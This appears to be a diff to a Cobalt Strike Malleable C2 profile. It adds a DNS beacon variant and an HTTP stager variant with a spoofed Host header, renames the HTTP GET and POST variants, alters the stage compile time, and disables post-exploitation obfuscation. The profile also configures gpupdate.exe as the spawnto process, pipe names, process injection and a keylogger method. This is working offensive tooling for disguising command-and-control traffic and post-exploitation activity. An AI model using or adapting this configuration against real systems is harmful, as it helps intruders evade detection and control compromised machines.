@@ -33,6 +33,26 @@ dns-beacon {
     set ns_response          "zero";
 }
 
+dns-beacon "vatiant_1" {
+    # Options moved into 'dns-beacon' group in 4.3:
+    set dns_idle             "8.8.8.8";
+    set dns_max_txt          "220";
+    set dns_sleep            "0";
+    set dns_ttl              "1";
+    set maxdns               "255";
+    set dns_stager_prepend   ".wwwds.";
+    set dns_stager_subhost   ".e2867.dsca.";
+     
+    # DNS subhost override options added in 4.3:
+    set beacon               "d-bx.";
+    set get_A                "d-1ax.";
+    set get_AAAA             "d-4ax.";
+    set get_TXT              "d-1tx.";
+    set put_metadata         "d-1mx";
+    set put_output           "d-1ox.";
+    set ns_response          "zero";
+}
+
 ###SMB options###
 set pipename "ntsvcs##";
 set pipename_stager "scerpc##";
@@ -62,11 +82,11 @@ https-certificate {
     set validity "365";
 }
 
-code-signer {
-    set keystore "your_keystore.jks";
-    set password "your_password";
-    set alias "server";
-}
+# code-signer {
+#     set keystore "your_keystore.jks";
+#     set password "your_password";
+#     set alias "server";
+# }
 
 ###HTTP-Config Block###
 http-config {
@@ -133,7 +153,7 @@ http-get {
 }
 
 ###HTTP-GET VARIANT###
-http-get "variant_name_get" {
+http-get "vatiant_1" {
 
     set uri "/uri1 /uri2 /uri3";
 
@@ -218,7 +238,7 @@ http-post {
 }
 
 ###HTTP-POST VARIANT###
-http-post "variant_name_post" {
+http-post "vatiant_1" {
     
     set uri "/Uri1 /Uri2 /Uri3";
     set verb "GET";
@@ -283,11 +303,37 @@ http-stager {
     }
 }
 
+http-stager "vatiant_1" {
+
+    set uri_x86 "/Console";
+    set uri_x64 "/console";
+
+    client {
+        header "Host" "whatever.com";
+        header "Connection" "close";
+	
+	    parameter "test1" "test2";
+    }
+
+    server {
+        #header "Server" "nginx";
+	
+	output {
+	
+	    prepend "content=";
+	    
+	    append "</script>\n";
+	    print;
+	}
+
+    }
+}
+
 
 ###Malleable PE/Stage Block###
 stage {
     set checksum        "0";
-    set compile_time    "25 Oct 2016 01:57:23";
+    set compile_time    "25 окт. 2016 01:57:23";
     set entry_point     "170000";
     #set image_size_x86 "6586368";
     #set image_size_x64 "6586368";
@@ -323,9 +369,9 @@ stage {
         strrep "beacon.x64.dll" "";
         }
 
-    string "something";
-    data "something";
-    stringw "something"; 
+    data "something2";
+    string "something1";
+    stringw "something3"; 
 }
 
 ###Process Inject Block###
@@ -366,11 +412,10 @@ process-inject {
 
 ###Post-Ex Block###
 post-ex {
-
     set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
     set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
 
-    set obfuscate "true";
+    set obfuscate "false";
 
     set smartinject "true";
 
@@ -380,5 +425,4 @@ post-ex {
     set thread_hint "ntdll.dll!RtlUserThreadStart";
     set pipename "DserNamePipe##";
     set keylogger "SetWindowsHookEx";
-
 }
